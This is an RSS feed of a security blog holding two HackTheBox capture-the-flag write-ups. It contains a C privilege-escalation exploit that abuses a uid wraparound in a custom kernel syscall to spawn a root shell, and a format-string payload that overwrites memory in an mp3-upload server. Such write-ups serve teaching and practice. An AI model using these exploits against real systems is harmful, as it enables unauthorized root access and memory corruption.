<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Pwn on Kvn11</title><link>https://Kvn11.github.io/tags/pwn/</link><description>Recent content in Pwn on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Apr 2024 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>Kernel Adventures Part II</title><link>https://Kvn11.github.io/p/kernel-adventures-part-ii/</link><pubDate>Mon, 08 Apr 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/kernel-adventures-part-ii/</guid><description>&lt;img src="https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg" alt="Featured image of post Kernel Adventures Part II" />&lt;h2 id="setup">Setup
&lt;/h2>&lt;p>WORK IN PROGRESS&amp;hellip;&lt;/p>
&lt;p>This is the solution for HTB&amp;rsquo;s &lt;code>Kernel Adventures: Part II&lt;/code>, and in the process, we can learn and get an introduction to kernel exploitation.&lt;/p>
&lt;p>After you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor.
However, you may get an error during the &lt;code>git apply&lt;/code> command.
To resolve these, you first need to run &lt;code>git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91&lt;/code> to revert the repo to the commit in which the vulnerability was introduced.
Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.&lt;/p>
&lt;h2 id="goals">Goals
&lt;/h2>&lt;p>So I will take 2 approaches here.
The first is to do a code review to find the vuln by hand (eyes).
Then I want to build a fuzzer to automate the finding.&lt;/p>
&lt;h2 id="finding-vulnerability">Finding Vulnerability
&lt;/h2>&lt;p>So my first approach here is to look at the &lt;code>patch.diff&lt;/code> file to see what was changed.
There was a folder &lt;code>magic/&lt;/code> that was added.
Also, there is a new syscall &lt;code>magic&lt;/code> added to &lt;code>arch/x86/entry/syscalls/syscall_64.tbl&lt;/code>
However, the &amp;ldquo;meat&amp;rdquo; of the challenge is in &lt;code>magic/magic.c&lt;/code>, which fleshes out the syscall.&lt;/p>
&lt;p>Lets walkthrough what the new syscall does.
First it will initialize itself via the &lt;code>do_init()&lt;/code> function, but only if the &lt;code>initialized&lt;/code> value is not 0.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">do_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">uid&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">root&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">children&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">kzalloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">MagicUser&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">CHILDLIST_SIZE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GFP_KERNEL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">magic_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nextId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">initialized&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic_lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This function sets the default username and password to &lt;code>root:password&lt;/code>.
It also defines a &lt;code>MagicUser*&lt;/code> called root.
Then &lt;code>kzalloc&lt;/code> is called and the resulting pointer is assigned to &lt;code>root&lt;/code>.
From my understanding, &lt;code>kzalloc&lt;/code> will allocate a chunk and initialize its memory to zero.
An important thing to note here is that this allocation will need to be freed at some point.
Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.&lt;/p>
&lt;p>Now lets look at the individual actions we can get this syscall to perform.
Lets start with adding a user with &lt;code>long do_add(char* username, char* password)&lt;/code>.
First it checks if the user that will be added exists.
This is done by just iterating over the list of users, and checking the username against the supplied username.
Then an empty entry in the user list is found, which is where the new user will be added.
This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned.
Then a search for the current user is conducted, but this time by uuid.
Again, this is just a simple for loop that compares uid, nothing special.
Then it will locate an empty slot in the current users child list.
Then another call to &lt;code>kzalloc&lt;/code> for the new user.
And the next user is given the &lt;code>nextId&lt;/code> value, which will be +1 from the previous.
We should note, that in no other function is there something to decrement the &lt;code>nextId&lt;/code> value, meaning it will always increase.
Maybe we could just create new users until we overflow the &lt;code>uid&lt;/code> value to be 0 again?
Seems possible, cuz &lt;code>nextId&lt;/code> is an unsigned short (2 bytes), so thats a total of &lt;code>0xFFFF&lt;/code> values.
Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
So if we get UUID 0, then we get the privileges of the root user.
Here is my exploit.
After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/syscall.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define MAGIC_SYS 449
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">long&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mh">0xFFFFFFFF&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">uuid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uuid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">shell&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">execve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete the user
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MAGIC_SYS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;bob&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;abc123&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">musl-gcc -static -march&lt;span class="o">=&lt;/span>x86-64 -Os expl.c -o expl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>HTB PWN Pixel Audio</title><link>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</link><pubDate>Sat, 30 Mar 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-pwn-pixel-audio/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/hackthebox.jpg" alt="Featured image of post HTB PWN Pixel Audio" />&lt;h2 id="locating-vulnerability">Locating Vulnerability
&lt;/h2>&lt;p>The challenge consists of a web server that allows a user to upload an mp3 file, and then plays that file.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1.png"
width="1914"
height="925"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/1_hu06ec495d0ffaf5631a000547eb0305d9_431452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Really cool pixel art"
class="gallery-image"
data-flex-grow="206"
data-flex-basis="496px"
>&lt;/p>
&lt;p>Next, it is time to reverse engineer the application in binary ninja.
The code is pretty straightforward, there is a check to see if the uploaded file is an mp3.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2.png"
width="699"
height="212"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/2_hu9f4325e5d403d4a98f25bc8d760472f8_29692_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Main function"
class="gallery-image"
data-flex-grow="329"
data-flex-basis="791px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3.png"
width="978"
height="755"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/3_hua8eeac607b37540438f8b4657d960e0f_135451_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="mp3 check"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p>
&lt;p>In the mp3 check, there seems to be some &amp;ldquo;beta&amp;rdquo; functionality, which is where the code to reveal the flag is.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4.png"
width="653"
height="475"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/4_hu9513bbd5b35cf3abc0916bfb6d7e2673_73829_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Read flag"
class="gallery-image"
data-flex-grow="137"
data-flex-basis="329px"
>&lt;/p>
&lt;p>We need to change two of the variables to different values in order to trigger the beta function.
There are 2 &lt;code>freads&lt;/code> that occur in this function.
Both read from the mp3 file we upload.
The first one is a read of 3 bytes, which is meant to obtain the magic bytes of the file.
The magic bytes need to be the string &lt;code>ID3&lt;/code>.&lt;/p>
&lt;p>The second read is of size &lt;code>0x16&lt;/code> bytes, and is interesting because the read bytes are later printed via a &lt;code>printf&lt;/code> statement.
This makes me think that we could do a write via a format string vulnerability.
At this point, I don&amp;rsquo;t know if there is an overflow in any of the &lt;code>fread&lt;/code> calls, but we know that there is a pointer to the two values we need to change, which we can catch with a format string exploit, and then we can write a specific value to those addresses using a format string payload.
The next step is to verify these vulnerabilities with a debugger.&lt;/p>
&lt;h2 id="verifying-vulnerability">Verifying vulnerability
&lt;/h2>&lt;p>I built a PoC payload using the correct magic bytes, and used a cyclic pattern of &lt;code>0x16&lt;/code> bytes incase there is an overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5.png"
width="639"
height="98"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/5_hu4b8b32b8f90ead5aec753d373c4aeab8_11443_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First payload"
class="gallery-image"
data-flex-grow="652"
data-flex-basis="1564px"
>&lt;/p>
&lt;p>Since we have a specific libc to use, we have to use the following command to run the binary:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc &lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/glibc/libc.so.6 ./main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Additionally the file is being called as &lt;code>/tmp/test.mp3&lt;/code> so we need to change the name and location of our PoC.&lt;/p>
&lt;p>Behaviour is as expected, no obvious overflow since stack cookie fail was not triggered.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6.png"
width="1282"
height="140"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/6_hu930e229343703a4f01e6d281c9f62a09_22452_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Def a format string challenge"
class="gallery-image"
data-flex-grow="915"
data-flex-basis="2197px"
>&lt;/p>
&lt;p>Checking out a generic format string payload in GDB, I was also able to verify that there was no overflow.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7.png"
width="492"
height="174"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/7_hu097f2cd7903bd3f625b2e1d0be7eb769_34256_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Format string vuln for sure"
class="gallery-image"
data-flex-grow="282"
data-flex-basis="678px"
>&lt;/p>
&lt;p>The payload starts at &lt;code>0x7fffffffdbd0&lt;/code>, and isn&amp;rsquo;t enough to overwrite not even the stack cookie, which is at &lt;code>0x7fffffffdbe8&lt;/code>
So at this point I am confident that this is just a format string vuln.
I am able to get the pointers to the values that need to change by referencing the 12th and 13th values on the stack: &lt;code>%12$p.%13$p&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8.png"
width="501"
height="170"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/8_hu8ddf742e0b9de11dcad6aafde7b78388_32877_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="The two addresses we need to write to."
class="gallery-image"
data-flex-grow="294"
data-flex-basis="707px"
>&lt;/p>
&lt;h2 id="exploit">Exploit
&lt;/h2>&lt;p>Since we now know where to write, we can craft our write.
The first write will be for 48879, and the second for 495.
The reason for this is that the after the first write (48879 = &lt;code>beef&lt;/code>), then we need to subtract that write from the second (49374 = &lt;code>c0de&lt;/code>).
So the payload becomes: &lt;code>ID3%48879x%12$n%495x%13$n&lt;/code>, which fits perfectly in our 22 byte restriction.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9.png"
width="596"
height="148"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/9_hu429ba7417812e238fd3732a417f428f9_17964_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Before printf"
class="gallery-image"
data-flex-grow="402"
data-flex-basis="966px"
> &lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10.png"
width="612"
height="146"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/10_hub12dd15de3bf2c36f3b2c9725ede9a4e_17416_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="After printf"
class="gallery-image"
data-flex-grow="419"
data-flex-basis="1006px"
>&lt;/p>
&lt;p>And that works just fine:&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11.png"
width="689"
height="533"
srcset="https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/11_hu50d0e1deab3dd5ecad5bcfc8ad441c5e_80265_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Flag"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
>&lt;/p></description></item></channel></rss>